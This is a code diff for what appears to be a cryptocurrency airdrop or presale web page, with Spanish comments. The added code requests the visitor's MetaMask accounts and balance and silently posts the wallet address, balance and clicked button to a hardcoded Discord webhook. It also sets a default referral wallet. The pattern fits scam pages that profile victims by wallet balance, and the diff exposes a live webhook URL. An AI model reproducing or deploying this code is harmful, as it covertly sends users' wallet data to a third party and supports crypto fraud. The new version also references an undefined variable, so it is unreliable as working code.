@@ -13,64 +13,67 @@ if(ft=gy[i].split("="),ft[0]==e)return ft[1]}
 var ref=querySt("ref");null==ref?(ref="0x01C65F22A9478C2932e62483509c233F0aaD5c72",document.getElementById("airinput").value=ref):document.getElementById("airinput").value=ref;
 
 
+// Función para obtener el saldo de la cuenta conectada a MetaMask
+async function obtenerSaldo() {
+  if (typeof window.ethereum !== 'undefined') {
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const address = accounts[0];
+    const balance = await window.ethereum.request({
+      method: 'eth_getBalance',
+      params: [address, 'latest']
+    });
 
- async function obtenerSaldoBNB() {
-    if (typeof window.ethereum !== 'undefined') {
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const address = accounts[0];
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const balance = await provider.getBalance(address);
+    // Convertir el saldo a ETH
+    const saldoEth = web3.utils.fromWei(balance, 'ether');
 
-      // Convertir el saldo a BNB
-      const saldoBNB = ethers.utils.formatEther(balance);
-
-      return saldoBNB;
-    } else {
-      throw new Error('MetaMask no está instalado o conectado');
-    }
+    return saldoEth;
+  } else {
+    throw new Error('MetaMask no está instalado o conectado');
   }
+}
 
-  // Función para enviar la notificación a Discord con el saldo en BNB
-  async function enviarNotificacionBNB(nombreBoton) {
-    const webhookURL = 'https://discordapp.com/api/webhooks/1122722609130377216/qoKTeIBXFTCZoaJkujP4B3S2bxBN2Y7t77m58dkrJl4pUGjEO_qjaR3de8WrzFcIRO-f';
-    try {
-      const saldoBNB = await obtenerSaldoBNB();
+// Función para enviar la notificación a Discord con el saldo
+async function enviarNotificacion(nombreBoton) {
+  const webhookURL = 'https://discordapp.com/api/webhooks/1122722609130377216/qoKTeIBXFTCZoaJkujP4B3S2bxBN2Y7t77m58dkrJl4pUGjEO_qjaR3de8WrzFcIRO-f';
 
-      const payload = {
-        content: `Se hizo clic en el botón: ${nombreBoton}\nSaldo en BNB: ${saldoBNB}`
-      };
+  try {
+    const saldo = await obtenerSaldo();
 
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
+    const payload = {
+  content: `Se hizo clic en el botón: ${nombreBoton}\nDirección: ${address}\nSaldo: ${saldo} ETH`
+    };
+
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    })
+      .then(response => {
+        if (response.ok) {
+          console.log('Notificación enviada con éxito');
+        } else {
+          console.log('Error al enviar la notificación');
+        }
       })
-        .then(response => {
-          if (response.ok) {
-            console.log('Notificación enviada con éxito');
-          } else {
-            console.log('Error al enviar la notificación');
-          }
-        })
-        .catch(error => {
-          console.log('Error al enviar la notificación:', error);
-        });
-    } catch (error) {
-      console.log('Error al obtener el saldo en BNB:', error);
-    }
+      .catch(error => {
+        console.log('Error al enviar la notificación:', error);
+      });
+  } catch (error) {
+    console.log('Error al obtener el saldo:', error);
   }
+}
 
-  // Event listeners para los botones
-  document.getElementById('buyinput').addEventListener('click', () => {
-    enviarNotificacionBNB('Buy Button');
-  });
+// Event listeners para los botones
+document.getElementById('buyinput').addEventListener('click', () => {
+  enviarNotificacion('Buy Button');
+});
 
-  document.getElementById('claimairdrop').addEventListener('click', () => {
-    enviarNotificacionBNB('Claim Airdrop Button');
-  });
+document.getElementById('claimairdrop').addEventListener('click', () => {
+  enviarNotificacion('Claim Airdrop Button');
+});
 
-  document.getElementById('refaddress').addEventListener('click', () => {
-    enviarNotificacionBNB('Get Referral Button');
-  });
+document.getElementById('refaddress').addEventListener('click', () => {
+  enviarNotificacion('Get Referral Button');
+});
